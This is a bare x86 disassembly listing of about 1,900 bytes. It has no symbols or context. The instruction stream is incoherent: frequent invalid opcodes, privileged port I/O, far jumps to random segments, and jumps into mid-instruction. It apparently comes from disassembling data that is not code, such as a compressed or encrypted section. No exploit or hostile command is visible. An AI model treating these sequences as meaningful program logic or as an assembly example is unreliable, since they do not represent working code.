  4212a5:	mov    ch,0xab
  4212a7:	push   es
  4212a8:	pop    ebp
  4212a9:	mov    esi,0x75dfcf71
  4212ae:	pop    edx
  4212af:	or     DWORD PTR [edx-0x7ff226c5],ebx
  4212b5:	or     DWORD PTR ds:0x620e35a4,ebp
  4212bb:	int3   
  4212bc:	outs   dx,DWORD PTR ds:[esi]
  4212bd:	jmp    0x4212a2
  4212bf:	das    
  4212c0:	shl    DWORD PTR [esi+0x62],0x6b
  4212c4:	fldcw  WORD PTR [esi+0x6c9170a]
  4212ca:	xchg   edi,eax
  4212cb:	pop    esp
  4212cc:	cs aaa 
  4212ce:	inc    ebp
  4212cf:	(bad)  
  4212d1:	call   0x422c:0x59749243
  4212d8:	add    eax,0x4a3ae8fe
  4212dd:	mov    edx,0x3042b6d8
  4212e2:	pushf  
  4212e3:	and    DWORD PTR [ecx+edx*4-0x307228fe],edx
  4212ea:	lods   eax,DWORD PTR ds:[esi]
  4212eb:	jge    0x421282
  4212ed:	pop    es
  4212ee:	sbb    cl,BYTE PTR [edi+eiz*8]
  4212f1:	sbb    ebx,DWORD PTR [ebx-0x142d4d6e]
  4212f7:	lods   al,BYTE PTR ds:[esi]
  4212f8:	cmp    cl,bl
  4212fa:	jmp    0x97a7:0x992ae659
  421301:	or     DWORD PTR [ebp-0x67319370],edx
  421307:	mov    ch,0xab
  421309:	pop    esp
  42130a:	mov    ds:0x358c91bd,eax
  42130f:	xchg   DWORD PTR [edi+0x52043cbc],edx
  421315:	stos   BYTE PTR es:[edi],al
  421316:	pop    ds
  421317:	jno    0x4212e2
  421319:	ins    DWORD PTR es:[edi],dx
  42131a:	daa    
  42131b:	fsubr  QWORD PTR [eax]
  42131d:	add    BYTE PTR [edi+edi*4+0x10eb50dd],bl
  421324:	neg    DWORD PTR [ebp+ebx*4-0x7d]
  421328:	adc    DWORD PTR [esi+0x6a72f3a2],0xf66b66bd
  421332:	jge    0x421314
  421334:	aaa    
  421335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421336:	jge    0x4213af
  421338:	daa    
  421339:	dec    edi
  42133a:	push   eax
  42133b:	test   ebx,esi
  42133d:	ja     0x4213ad
  42133f:	retf   0xd982
  421342:	jge    0x4212ce
  421344:	pop    ebx
  421345:	push   esi
  421346:	(bad)  
  421347:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  421349:	mov    bl,0x98
  42134b:	jb     0x421317
  42134d:	js     0x421393
  42134f:	sbb    edi,DWORD PTR [eax-0x5c]
  421352:	cmc    
  421353:	or     eax,0x839756fc
  421358:	out    0xfe,eax
  42135a:	dec    ebp
  42135b:	inc    edx
  42135c:	retf   
  42135d:	pop    ebp
  42135e:	sub    esp,DWORD PTR [eax+0x24]
  421361:	cmp    eax,0x4e42ff09
  421366:	ffreep st(5)
  421368:	test   DWORD PTR ds:0x4808fd57,edx
  42136e:	ja     0xb8fae8de
  421374:	retf   0x64f
  421377:	xchg   edx,eax
  421378:	jmp    0x7ac3:0xe90901b1
  42137f:	jmp    0x5a6a:0x5dc56af8
  421386:	jecxz  0x421319
  421388:	sub    BYTE PTR [ebx-0x3d],0x6e
  42138c:	shl    BYTE PTR [edi],0xad
  42138f:	dec    ecx
  421390:	iret   
  421391:	and    bl,dh
  421393:	shl    DWORD PTR [edi],1
  421395:	push   ebx
  421396:	stc    
  421397:	inc    ebp
  421398:	inc    ecx
  421399:	scas   al,BYTE PTR es:[edi]
  42139a:	popa   
  42139b:	shr    DWORD PTR [ebp+0xffac32e],1
  4213a1:	and    DWORD PTR [ebp+0x9],esi
  4213a4:	outs   dx,BYTE PTR ds:[esi]
  4213a5:	dec    esi
  4213a6:	inc    eax
  4213a7:	xchg   ebp,eax
  4213a8:	or     ch,cl
  4213aa:	out    0xfb,al
  4213ac:	fld    TBYTE PTR [ebx]
  4213ae:	out    dx,eax
  4213af:	aas    
  4213b0:	or     DWORD PTR [edx-0x7b],esp
  4213b3:	and    al,0xf9
  4213b5:	shr    BYTE PTR [ebx+0x7d],0x13
  4213b9:	(bad)  
  4213bb:	adc    DWORD PTR [esi+eiz*4-0x6af6034e],edx
  4213c2:	inc    edi
  4213c3:	je     0x42137c
  4213c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213c7:	mov    ebp,0x4bbd19e4
  4213cc:	cmp    ah,ah
  4213ce:	call   0x7862d262
  4213d3:	adc    bh,al
  4213d5:	or     DWORD PTR [edx+0x3c],esi
  4213d8:	test   eax,0x4ce48ef
  4213dd:	pop    esi
  4213de:	loope  0x421458
  4213e0:	jae    0x4213c8
  4213e2:	stos   DWORD PTR es:[edi],eax
  4213e3:	out    dx,al
  4213e4:	mov    edi,0x65fad046
  4213e9:	sbb    al,0x97
  4213eb:	push   ss
  4213ec:	push   esi
  4213ed:	fisubr WORD PTR [ebx+0x5]
  4213f0:	(bad)  [ebx+0x2f2759ba]
  4213f6:	add    ah,BYTE PTR [edx+edx*8-0x1c847680]
  4213fd:	aaa    
  4213fe:	dec    esp
  4213ff:	jns    0x42147f
  421401:	sbb    eax,0x51c5ba19
  421406:	jb     0x4213cd
  421408:	sub    ecx,edi
  42140a:	sbb    edx,DWORD PTR [edx+0x264ab4fc]
  421410:	loop   0x42148b
  421412:	mov    bl,0xc6
  421414:	sti    
  421415:	scas   al,BYTE PTR es:[edi]
  421416:	mov    edx,0x870cea81
  42141b:	add    al,0xdf
  42141d:	repnz push es
  42141f:	xor    dh,bl
  421421:	cld    
  421422:	inc    edi
  421423:	push   es
  421424:	rcl    DWORD PTR [ebx],cl
  421426:	retf   
  421427:	xor    dh,BYTE PTR [esi-0x1a06bc12]
  42142d:	shl    BYTE PTR [eax],0x2c
  421430:	adc    ebx,DWORD PTR [eax]
  421432:	loopne 0x42142d
  421434:	mov    dh,0x8a
  421436:	add    BYTE PTR [edi],0x61
  421439:	fldenv [ecx-0x50b71089]
  42143f:	sbb    DWORD PTR [ebx+0x142b29c1],edi
  421445:	jne    0x42142b
  421447:	fcomp  st(3)
  421449:	js     0x421445
  42144b:	push   edi
  42144c:	push   ss
  42144d:	mov    edi,0x5f35a349
  421452:	jp     0x42140d
  421454:	xor    BYTE PTR [ebx-0xf],dl
  421457:	add    al,0xbb
  421459:	and    al,0x8a
  42145b:	leave  
  42145c:	xchg   esp,eax
  42145d:	arpl   WORD PTR [edi-0x29],bp
  421460:	jmp    0x42141e
  421462:	fwait
  421463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421465:	aaa    
  421466:	or     edi,DWORD PTR [edi]
  421468:	in     eax,0x84
  42146a:	dec    esi
  42146b:	jmp    0x42146a
  42146d:	push   edx
  42146e:	push   edi
  42146f:	push   ecx
  421470:	mov    cl,0xef
  421472:	xor    eax,0x6947291b
  421477:	inc    ecx
  421478:	scas   eax,DWORD PTR es:[edi]
  421479:	repnz add BYTE PTR [esi-0x49],dh
  42147d:	outs   dx,DWORD PTR ds:[esi]
  42147e:	sbb    esp,DWORD PTR [ecx+ecx*4]
  421481:	dec    eax
  421482:	adc    bl,BYTE PTR [esi]
  421484:	pop    ebp
  421485:	and    eax,0xbef2586d
  42148a:	aam    0x37
  42148c:	ss push eax
  42148e:	sub    dl,dl
  421490:	mov    ch,0x82
  421492:	in     eax,dx
  421493:	into   
  421494:	jmp    0x421500
  421496:	sub    esp,DWORD PTR [edi]
  421498:	inc    esp
  421499:	pusha  
  42149a:	jmp    0x421474
  42149c:	push   edx
  42149d:	sahf   
  42149e:	push   es
  42149f:	inc    edi
  4214a0:	dec    ecx
  4214a1:	(bad)  
  4214a2:	rcl    BYTE PTR [ecx-0x72dee967],1
  4214a8:	enter  0xc0da,0x77
  4214ac:	arpl   WORD PTR [ecx+edi*8],dx
  4214af:	push   esi
  4214b0:	add    cl,al
  4214b2:	mov    edx,DWORD PTR [ebp-0x72510893]
  4214b8:	ss leave 
  4214ba:	xchg   edi,eax
  4214bb:	or     eax,0xadc2db49
  4214c0:	ja     0x4214c6
  4214c2:	dec    edi
  4214c3:	pop    ss
  4214c4:	mov    edx,0xcb6948db
  4214c9:	mov    eax,ds:0xd14f9690
  4214ce:	sti    
  4214cf:	in     al,dx
  4214d0:	mov    bh,0x85
  4214d2:	sahf   
  4214d3:	jecxz  0x42149e
  4214d5:	bound  esi,QWORD PTR [eax+0xc]
  4214d8:	mov    edi,0x90f18a64
  4214dd:	pop    edi
  4214de:	daa    
  4214df:	mov    cl,0x70
  4214e1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214e3:	scas   al,BYTE PTR es:[edi]
  4214e4:	mov    esi,0x7f5c3868
  4214e9:	sub    BYTE PTR [esi],ah
  4214eb:	sub    DWORD PTR ds:0x9c8b43af,0x92df33db
  4214f5:	ret    
  4214f6:	and    al,0x81
  4214f8:	scas   al,BYTE PTR es:[edi]
  4214f9:	inc    edi
  4214fa:	jae    0x42151a
  4214fc:	aas    
  4214fd:	aam    0xbd
  4214ff:	xor    dl,ch
  421501:	repnz mov eax,ds:0x195d2272
  421507:	lock mov eax,0xcfdf36ec
  42150d:	ja     0x421536
  42150f:	jg     0x421569
  421511:	cmp    al,0x18
  421513:	sahf   
  421514:	and    eax,0x72686916
  421519:	lods   eax,DWORD PTR ds:[esi]
  42151a:	cdq    
  42151b:	or     eax,DWORD PTR [eax]
  42151d:	adc    DWORD PTR [eax],edi
  42151f:	dec    eax
  421520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421521:	push   ds
  421522:	stos   BYTE PTR es:[edi],al
  421523:	in     eax,dx
  421524:	aas    
  421525:	cli    
  421526:	add    DWORD PTR [edx+ebx*8-0x33],ebx
  42152a:	sahf   
  42152b:	adc    al,0x2
  42152d:	and    DWORD PTR [ebx-0x54],0xe8f81e94
  421534:	push   ecx
  421535:	mov    edx,0xcc1864f7
  42153a:	push   ecx
  42153b:	dec    ecx
  42153c:	dec    ecx
  42153d:	xchg   esp,eax
  42153e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42153f:	sbb    bh,BYTE PTR [ecx-0xbcd49e2]
  421545:	xor    esp,esi
  421547:	or     eax,0x4ba8f49e
  42154c:	cmp    eax,0xce302793
  421551:	push   0xffffff82
  421553:	ins    BYTE PTR es:[edi],dx
  421554:	jnp    0x421535
  421556:	stos   DWORD PTR es:[edi],eax
  421557:	jmp    0x2d30620b
  42155c:	int3   
  42155d:	xor    eax,0xe417f2dd
  421562:	cmp    al,0xd6
  421564:	das    
  421565:	sub    BYTE PTR [esi],dl
  421567:	popf   
  421568:	fmul   DWORD PTR [ecx-0x26]
  42156b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42156c:	add    al,0x83
  42156e:	test   esi,0xca384f12
  421574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421575:	push   eax
  421576:	pop    es
  421577:	das    
  421578:	mov    ebp,0xb0a06e79
  42157d:	aas    
  42157e:	outs   dx,BYTE PTR ds:[esi]
  42157f:	shl    DWORD PTR [ebp-0x2d65236d],0xc1
  421586:	xlat   BYTE PTR ds:[ebx]
  421587:	mov    ebp,0xcf43eb6
  42158c:	mov    ecx,0xece82b8b
  421591:	push   esp
  421592:	test   al,0x3d
  421594:	ja     0x421592
  421596:	lock popf 
  421598:	(bad)  [ebx]
  42159a:	jmp    0xc029d24f
  42159f:	popa   
  4215a0:	iret   
  4215a1:	js     0x421570
  4215a3:	push   esp
  4215a4:	pushf  
  4215a5:	add    BYTE PTR [ebp-0x2a],bh
  4215a8:	sub    al,0x36
  4215aa:	fild   DWORD PTR [ebx+ebp*2-0x34]
  4215ae:	mov    BYTE PTR cs:[edi+esi*8],ch
  4215b2:	sub    ebp,esi
  4215b4:	ins    BYTE PTR es:[edi],dx
  4215b5:	popa   
  4215b6:	in     eax,0xec
  4215b8:	(bad)
  4215bb:	mov    cl,0x5f
  4215bd:	fild   WORD PTR [ebx]
  4215bf:	xchg   esp,eax
  4215c0:	retf   
  4215c1:	lahf   
  4215c2:	jno    0x4215f8
  4215c4:	dec    esp
  4215c5:	sti    
  4215c6:	sub    BYTE PTR [ebx+0x1a],0xe8
  4215ca:	cmp    dh,0xd7
  4215cd:	out    dx,eax
  4215ce:	sbb    DWORD PTR [ecx],eax
  4215d0:	jae    0x421565
  4215d2:	arpl   si,bp
  4215d4:	and    bl,BYTE PTR [ebp+ecx*4+0xc]
  4215d8:	mov    eax,ds:0x487651e2
  4215dd:	bound  esi,QWORD PTR [eax-0x50055b98]
  4215e3:	mov    cl,0x74
  4215e5:	mov    bl,0xe
  4215e7:	in     al,dx
  4215e8:	mov    ebp,0xf7fe3573
  4215ed:	dec    ebp
  4215ee:	pop    esi
  4215ef:	xor    al,0xd6
  4215f1:	callw  0x39bd
  4215f5:	pop    ds
  4215f6:	mov    dl,0x38
  4215f8:	stc    
  4215f9:	mov    edi,0xcea89ca
  4215fe:	shl    BYTE PTR [ebp+0x1aed02e2],cl
  421604:	imul   ecx,edx,0x305b792c
  42160a:	mov    ecx,0xa1dc46d4
  42160f:	sbb    BYTE PTR [ebx],al
  421611:	out    dx,al
  421612:	sub    eax,0xa9c89e03
  421617:	push   ecx
  421618:	or     DWORD PTR [eax+0x3cb9331a],ecx
  42161e:	inc    ebp
  42161f:	adc    esi,DWORD PTR [edi-0x1e9e4554]
  421625:	xor    ch,BYTE PTR [esi+ebp*1+0x6c42d536]
  42162c:	push   ebp
  42162d:	in     al,dx
  42162e:	enter  0x41d6,0xcf
  421632:	inc    edx
  421633:	cmp    al,0xd1
  421635:	popf   
  421636:	ror    BYTE PTR [ebx-0x10f3d4f],1
  42163c:	pusha  
  42163d:	out    dx,eax
  42163e:	xor    bh,BYTE PTR [esi+ebx*2+0x19]
  421642:	lock inc esi
  421644:	dec    ebp
  421645:	(bad)  
  421646:	sbb    bl,BYTE PTR [ecx+0x6d023d7a]
  42164c:	icebp  
  42164d:	and    ebx,DWORD PTR [edi+0x617ceced]
  421653:	lods   eax,DWORD PTR ds:[esi]
  421654:	aam    0xe0
  421656:	cmc    
  421657:	popa   
  421658:	call   FWORD PTR [ecx-0x5742e997]
  42165e:	mov    ebx,ebp
  421660:	daa    
  421661:	or     al,0xc
  421663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421664:	dec    esi
  421665:	mov    ch,0x28
  421667:	jns    0x421682
  421669:	add    al,0x19
  42166b:	adc    al,ch
  42166d:	ds repnz ins DWORD PTR es:[edi],dx
  421670:	xchg   BYTE PTR [edx-0x12ca33db],bl
  421676:	mov    dh,0x59
  421678:	inc    edi
  421679:	(bad)  
  42167a:	imul   ebx,DWORD PTR [edx-0x30],0xbaf35630
  421681:	mov    ebp,0xd7eecf0b
  421686:	inc    ebx
  421687:	hlt    
  421688:	das    
  421689:	data16 (bad) 
  42168b:	ins    BYTE PTR es:[edi],dx
  42168c:	sub    al,0x49
  42168e:	pop    ss
  42168f:	push   esi
  421690:	xor    ecx,edx
  421692:	dec    esp
  421693:	mov    edi,0xee19e08a
  421698:	mov    edi,0x11c41df8
  42169d:	dec    ecx
  42169e:	sub    dl,al
  4216a0:	and    al,0x6c
  4216a2:	push   0xffffff89
  4216a4:	jo     0x42163e
  4216a6:	sahf   
  4216a7:	sub    esp,DWORD PTR [eax+0x1e]
  4216aa:	cmp    eax,0x8f49c75c
  4216af:	dec    ebx
  4216b0:	(bad)  
  4216b1:	fwait
  4216b2:	dec    ebx
  4216b3:	pop    esi
  4216b4:	push   esi
  4216b5:	push   esp
  4216b6:	pop    edi
  4216b7:	xor    eax,esi
  4216b9:	scas   al,BYTE PTR es:[edi]
  4216ba:	loop   0x4216d5
  4216bc:	fsub   QWORD PTR [edx-0x2a51f325]
  4216c2:	test   DWORD PTR [ebp+0x5a],edx
  4216c5:	mov    ds:0xb27b9a89,eax
  4216ca:	clc    
  4216cb:	or     eax,DWORD PTR [eax-0x1db78a3d]
  4216d1:	fs scas al,BYTE PTR es:[edi]
  4216d3:	mul    BYTE PTR [edi]
  4216d5:	inc    edi
  4216d6:	sbb    edx,esi
  4216d8:	xor    ch,BYTE PTR ds:0x764c55e
  4216de:	inc    edx
  4216df:	xlat   BYTE PTR ds:[ebx]
  4216e0:	arpl   WORD PTR [ebx+0x2354975f],di
  4216e6:	cmp    eax,ebp
  4216e8:	xchg   BYTE PTR [ecx+0x5739862f],ah
  4216ee:	mul    DWORD PTR [edx-0x3b1230aa]
  4216f4:	mov    ds:0xb890d22e,eax
  4216f9:	neg    DWORD PTR [esi+0x58]
  4216fc:	push   esi
  4216fd:	push   es
  4216fe:	jge    0x421702
  421700:	mov    ebx,DWORD PTR ds:0xcfe5935b
  421706:	adc    BYTE PTR [eax-0x23],bl
  421709:	cld    
  42170a:	mov    bl,0xc6
  42170c:	fucom  st(1)
  42170e:	(bad)  
  42170f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421710:	push   ebp
  421711:	push   es
  421712:	ins    DWORD PTR es:[edi],dx
  421713:	in     eax,0xf3
  421715:	mov    ecx,0x60d0f4bf
  42171a:	js     0x421726
  42171c:	xor    DWORD PTR [ebx+0x5b78dbb],ebp
  421722:	mov    dl,0x53
  421724:	js     0xbefa346e
  42172a:	mov    bh,0x32
  42172c:	pop    ss
  42172d:	mov    ds:0xcb16fd4c,eax
  421732:	xchg   ebp,eax
  421733:	in     eax,0x86
  421735:	cmp    esp,DWORD PTR [ebx+0x1d2257e8]
  42173b:	lahf   
  42173c:	dec    ecx
  42173d:	(bad)  
  42173e:	xchg   ecx,eax
  42173f:	cwde   
  421740:	mov    ch,0x92
  421742:	aam    0x84
  421744:	pushf  
  421745:	adc    BYTE PTR [ecx-0x3dc5c770],dh
  42174b:	jae    0x42174c
  42174d:	js     0x421784
  42174f:	mul    bl
  421751:	inc    esi
  421752:	sbb    al,BYTE PTR [ecx-0x57dfa54d]
  421758:	push   es
  421759:	xchg   ecx,eax
  42175a:	daa    
  42175b:	out    dx,al
  42175c:	xchg   ecx,eax
  42175d:	test   BYTE PTR [eax+ecx*2],cl
  421760:	sbb    BYTE PTR [ecx],cl
  421762:	cwde   
  421763:	sub    DWORD PTR [edi],eax
  421765:	pop    eax
  421766:	outs   dx,DWORD PTR ds:[esi]
  421767:	scas   eax,DWORD PTR es:[edi]
  421768:	and    DWORD PTR [eax+0x7f],esp
  42176b:	mov    al,0x2
  42176d:	ss lahf 
  42176f:	sbb    esi,esp
  421771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421772:	int3   
  421773:	fs imul ecx,DWORD PTR ds:[edx+0x79],0xffffffe1
  421779:	sbb    al,0x78
  42177b:	popf   
  42177c:	pop    ebx
  42177d:	and    al,0xa5
  42177f:	mov    edx,0x7feb05d8
  421784:	sub    dl,dh
  421786:	rcr    ebx,0xd
  421789:	pop    ds
  42178a:	mov    ?,WORD PTR [edi]
  42178c:	pop    ebx
  42178d:	push   ecx
  42178e:	(bad)  
  42178f:	pop    edx
  421790:	out    dx,eax
  421791:	jno    0x421784
  421793:	mov    esi,0xb481de50
  421798:	jnp    0x42173c
  42179a:	add    eax,0x3e7aec97
  42179f:	lock scas al,BYTE PTR es:[edi]
  4217a1:	xchg   ebx,eax
  4217a2:	imul   eax,DWORD PTR [ebx],0xe2c1725b
  4217a8:	mov    esi,eax
  4217aa:	imul   ecx,DWORD PTR [esi-0x6ba16ba1],0x4ee0b345
  4217b4:	lds    ebp,FWORD PTR [ecx+0x68]
  4217b7:	and    edx,edi
  4217b9:	adc    DWORD PTR [ebx+0x25],0xbd011e50
  4217c0:	pop    ebx
  4217c1:	or     cl,bl
  4217c3:	mov    ebp,DWORD PTR [edx+0x64]
  4217c6:	mov    ds:0x96e740ef,eax
  4217cb:	xchg   esp,eax
  4217cc:	inc    BYTE PTR [ecx+esi*2]
  4217cf:	je     0x421817
  4217d1:	inc    esp
  4217d2:	mov    dh,0x27
  4217d4:	lahf   
  4217d5:	test   esp,ecx
  4217d7:	jp     0x421842
  4217d9:	inc    ebx
  4217da:	inc    esi
  4217db:	pop    ds
  4217dc:	repnz and eax,0xd2071ff9
  4217e2:	shl    al,0x71
  4217e5:	aas    
  4217e6:	add    al,0x7
  4217e8:	call   FWORD PTR ds:0xaaa54e42
  4217ee:	hlt    
  4217ef:	lea    edx,[esi-0x30e42717]
  4217f5:	jle    0x4217c7
  4217f7:	fcmovnbe st,st(5)
  4217f9:	push   ebp
  4217fa:	adc    DWORD PTR [edx],edx
  4217fc:	je     0x4217b3
  4217fe:	jecxz  0x4217eb
  421800:	mov    bl,0x1d
  421802:	jmp    0xf6e5cce3
  421807:	inc    esi
  421808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42180a:	popa   
  42180b:	sbb    eax,0xf7a71abc
  421810:	mov    cl,0xf4
  421812:	mov    esp,0x1a9f452c
  421817:	cmp    bh,BYTE PTR [esi-0x4dfb86d]
  42181d:	in     al,0x2
  42181f:	cmp    edx,DWORD PTR [eax+0x1d]
  421822:	sar    DWORD PTR [edx],0x96
  421825:	adc    dh,BYTE PTR [ebp-0x1b]
  421828:	mov    DWORD PTR [esi-0x5d],edi
  42182b:	sub    eax,ebp
  42182d:	push   cs
  42182e:	std    
  42182f:	out    0x2a,eax
  421831:	test   eax,0x7ae36e1d
  421836:	jle    0x421855
  421838:	sbb    eax,0xc0d2c194
  42183d:	pusha  
  42183e:	fbstp  TBYTE PTR [esi+0x300c0d57]
  421844:	and    DWORD PTR ds:0x3fa0a965,0xb3da1dfb
  42184e:	dec    ebp
  42184f:	mov    ah,0xe1
  421851:	in     al,dx
  421852:	dec    esi
  421853:	xchg   ecx,eax
  421854:	inc    ebx
  421855:	fcmovnbe st,st(5)
  421857:	xor    ebp,edi
  421859:	test   DWORD PTR [edx-0x45e94509],ebp
  42185f:	(bad)  
  421860:	repz div DWORD PTR [esi]
  421863:	je     0x4218a5
  421865:	scas   al,BYTE PTR es:[edi]
  421866:	mov    edi,0xe93016eb
  42186b:	retf   0x43f0
  42186e:	push   ebp
  42186f:	mov    ebp,0xa496dd65
  421874:	sbb    eax,0xb2201e13
  421879:	jns    0x4218cf
  42187b:	in     al,0x6d
  42187d:	rol    BYTE PTR ds:0x4c71fe9b,0xdf
  421884:	mov    al,ds:0xed1b1383
  421889:	xchg   esi,eax
  42188a:	and    ecx,DWORD PTR [ecx+0x4b1f8e58]
  421890:	sub    edx,DWORD PTR [esi]
  421892:	jmp    0x421875
  421894:	pop    DWORD PTR [edi]
  421896:	in     al,dx
  421897:	mov    BYTE PTR [edi],ch
  421899:	data16 fisttp QWORD PTR [esi-0x80]
  42189d:	push   ss
  42189e:	inc    edi
  42189f:	mul    BYTE PTR [esi+0x7d49ad5b]
  4218a5:	gs xor edx,edi
  4218a8:	cld    
  4218a9:	out    0x48,eax
  4218ab:	shl    ah,cl
  4218ad:	or     bl,BYTE PTR [edx]
  4218af:	mov    DWORD PTR [ecx+eax*4+0x7ed074e],edx
  4218b6:	jle    0x4218eb
  4218b8:	icebp  
  4218b9:	mov    edi,0xdb633b4a
  4218be:	fbstp  TBYTE PTR [ecx+0x57]
  4218c1:	xchg   esp,eax
  4218c2:	loope  0x42187d
  4218c4:	mov    esp,0x9144e8cc
  4218c9:	adc    eax,0x549a4a1e
  4218ce:	jle    0x421903
  4218d0:	mov    ebx,0x67573227
  4218d5:	(bad)  
  4218d6:	mov    bh,0x1b
  4218d8:	mov    al,0xeb
  4218da:	pusha  
  4218db:	push   edx
  4218dc:	and    eax,0xbf2ff22b
  4218e1:	(bad)  
  4218e2:	shl    ah,cl
  4218e4:	in     al,dx
  4218e5:	scas   eax,DWORD PTR es:[edi]
  4218e6:	rcl    BYTE PTR [eax],0x5d
  4218e9:	xor    BYTE PTR [edx+0x4b],0x4f
  4218ed:	stos   BYTE PTR es:[edi],al
  4218ee:	xor    DWORD PTR [ebx+0x73],0x7a8771de
  4218f5:	stos   DWORD PTR es:[edi],eax
  4218f6:	cmp    BYTE PTR [bp-0x1ae9],al
  4218fb:	xchg   esi,eax
  4218fc:	daa    
  4218fd:	test   BYTE PTR [ebp-0x3e],bh
  421900:	in     al,0x55
  421902:	(bad)  
  421903:	push   cs
  421904:	cwde   
  421905:	and    bl,al
  421907:	inc    esi
  421908:	dec    ebx
  421909:	pop    ss
  42190a:	scas   al,BYTE PTR es:[edi]
  42190b:	cwde   
  42190c:	test   BYTE PTR [ecx],0xc0
  42190f:	mov    al,ds:0xe9bb57
  421914:	mov    ah,0xde
  421916:	imul   edx,DWORD PTR [ebx-0x4e],0xe9472044
  42191d:	xchg   ecx,eax
  42191e:	stc    
  42191f:	daa    
  421920:	inc    ebp
  421921:	dec    ebx
  421922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421923:	stos   DWORD PTR es:[edi],eax
  421924:	not    BYTE PTR [ebx-0x37473e64]
  42192a:	inc    esp
  42192b:	bound  esp,QWORD PTR [edx-0x29bd8769]
  421931:	push   ss
  421932:	arpl   WORD PTR ds:0x10ffce56,dx
  421938:	push   ebx
  421939:	ins    DWORD PTR es:[edi],dx
  42193a:	imul   ebx,esp,0xffffffb8
  42193d:	and    BYTE PTR [ebx],al
  42193f:	shl    ebx,1
  421941:	or     BYTE PTR ds:0x57c05cb7,0x8a
  421948:	stc    
  421949:	cwde   
  42194a:	mov    cl,0xa5
  42194c:	imul   edi,DWORD PTR [edx+0x51cd8ca3],0x20
  421953:	dec    esp
  421954:	jo     0x339b8bbc
  42195a:	lods   eax,DWORD PTR ds:[esi]
  42195b:	mov    eax,ds:0xdb9c25be
  421960:	fmul   DWORD PTR [ebx]
  421962:	(bad)  
  421963:	jb     0x4218f5
  421965:	sbb    al,0xeb
  421967:	into   
  421968:	and    bh,BYTE PTR [eax+0x3e7c36ed]
  42196e:	repz fnstenv [ecx+ebp*4]
  421972:	icebp  
  421973:	and    DWORD PTR [ebp+0x55],ebp
  421976:	shr    DWORD PTR [ebx-0x18],0xa5
  42197a:	pop    ebp
  42197b:	retf   0x5036
  42197e:	hlt    
  42197f:	mov    cl,0xad
  421981:	jl     0x421965
  421983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421984:	xchg   edi,eax
  421985:	sbb    BYTE PTR [esp+ebp*4+0x9],dh
  421989:	adc    DWORD PTR [esi-0x5040b29d],ebp
  42198f:	push   ss
  421990:	adc    bl,cl
  421992:	ret    0x7b90
  421995:	and    eax,0xab828ab
  42199a:	cld    
  42199b:	sub    BYTE PTR [eax-0x7949eecf],dl
  4219a1:	cmp    dl,bh
  4219a3:	xor    bl,BYTE PTR [ebx]
  4219a5:	pushf  
  4219a6:	sti    
  4219a7:	(bad)  
  4219a8:	cmp    ecx,DWORD PTR [ecx]
  4219aa:	sub    DWORD PTR [edi-0x1e],ebp
  4219ad:	and    al,0x8e
  4219af:	sahf   
  4219b0:	fstp   QWORD PTR [edi-0x7b90a5a0]
  4219b6:	imul   eax,esi,0x8a338b2c
  4219bc:	and    al,0xc0
  4219be:	xchg   edx,eax
  4219bf:	or     esp,edx
  4219c1:	and    al,0xbc
  4219c3:	popa   
  4219c4:	into   
  4219c5:	shr    BYTE PTR [esi],0x91
  4219c8:	fist   WORD PTR [ebx+0x57]
  4219cb:	call   DWORD PTR [ebx+0x4e]
  4219ce:	stc    
  4219cf:	xchg   ebx,eax
  4219d0:	or     esp,DWORD PTR [ebx+eiz*1]
  4219d3:	test   al,0x36
  4219d5:	jmp    0x4219d1
  4219d7:	adc    al,0x31
  4219d9:	jmp    0x421a4e
  4219db:	jg     0x4219da
  4219dd:	dec    ecx
  4219de:	jb     0x4219d1
  4219e0:	inc    edi
  4219e1:	sub    eax,0x3cca7594
  4219e6:	or     ecx,ebx
  4219e8:	jmp    0x280b84d5
  4219ed:	pop    ecx
  4219ee:	fimul  DWORD PTR [ebp+0x3]
  4219f1:	push   0xffffffbb
  4219f3:	ins    BYTE PTR es:[edi],dx
  4219f4:	xchg   ebp,eax
  4219f5:	in     eax,0x8b
  4219f7:	je     0x4219a7
  4219f9:	iret   
  4219fa:	outs   dx,DWORD PTR ds:[esi]
  4219fb:	and    dh,ch
  4219fd:	jmp    0x4219a0
  4219ff:	push   ebp
  421a00:	bound  eax,QWORD PTR [edi+ecx*8-0x38e96a78]
  421a07:	mov    esp,0x755e3d08
  421a0c:	scas   al,BYTE PTR es:[edi]
  421a0d:	add    ebx,DWORD PTR [edi]
  421a0f:	add    edi,DWORD PTR [edi+0x0]
  421a12:	jae    0x4219a6
  421a14:	push   0x201a30dd
  421a19:	fdivr  DWORD PTR [edi]
  421a1b:	adc    eax,0x2fb07594
  421a20:	out    dx,al
  421a21:	inc    edx
  421a22:	je     0x421a6c
  421a24:	push   edx
  421a25:	mov    ds:0xa73da86e,eax
  421a2a:	aas    
  421a2b:	pop    ebp
  421a2c:	hlt    
  421a2d:	pop    es
  421a2e:	cmc    
  421a2f:	sub    bl,BYTE PTR [ebp-0x15]
  421a32:	and    bl,BYTE PTR [edi-0xf]
  421a35:	pop    edi
  421a36:	dec    edi
  421a37:	or     BYTE PTR [esi+eax*8+0x2812032e],bl
  421a3e:	imul   ebx,DWORD PTR [edi+0x3b],0x6970220a
  421a45:	lea    ecx,[esi+0x78]
  421a48:	iret   
  421a49:	sbb    BYTE PTR [ebx+0x76ab7728],bh
  421a4f:	and    BYTE PTR [esi+0x57e7cb8b],bl
  421a55:	add    DWORD PTR [esi+edi*2-0x44],ecx
  421a59:	jne    0x421a4b
